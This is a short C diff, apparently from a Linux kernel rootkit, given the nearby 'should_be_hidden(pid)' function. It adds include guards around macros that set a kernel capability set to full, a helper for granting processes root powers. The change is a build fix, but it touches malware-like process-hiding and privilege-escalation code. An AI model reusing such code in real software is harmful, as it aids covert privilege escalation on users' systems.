@@ -215,8 +215,12 @@ int should_be_hidden(pid_t pid)
 	return 0;
 }
 #ifndef cap_set_full
+#ifndef CAP_FULL_SET
 # define CAP_FULL_SET     ((kernel_cap_t){{ ~0, ~0 }})
+#endif
+#ifndef cap_set_full
 # define cap_set_full(c)      do { (c) = ((kernel_cap_t){{ ~0, ~0 }}); } while (0)
+#endif
 #endif
 
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
